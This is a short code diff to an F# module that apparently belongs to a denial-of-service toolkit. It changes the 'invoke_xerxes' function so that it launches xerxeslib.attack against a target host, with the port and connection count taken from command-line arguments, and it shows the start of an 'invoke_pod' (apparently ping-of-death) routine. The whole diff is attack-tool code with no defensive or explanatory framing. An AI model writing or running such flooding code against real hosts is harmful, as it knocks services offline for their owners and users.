@@ -22,16 +22,15 @@ module sultan =
         0
 
     let invoke_xerxes (args : string[]) =
-            let connections = 0
-            let port = 0
          if args.Length < 2 then
              error "200 Target host not provided. Aborting."
              exit 1
-                else verbose "starting...\n"
+             else verbose "starting...\n"
 
-            xerxeslib.attack args.[1] port 0 connections
-            Thread.Sleep(Timeout.Infinite);
-            0
+         xerxeslib.attack args.[1] (Int32.Parse(args.[2])) 1 (Int32.Parse(args.[3]))
+         Thread.Sleep(Timeout.Infinite);
+         0
+
     let invoke_pod (args : string array) =
         if args.Length < 2 then
                 error "300 Target host or IP not provided. Aborting."
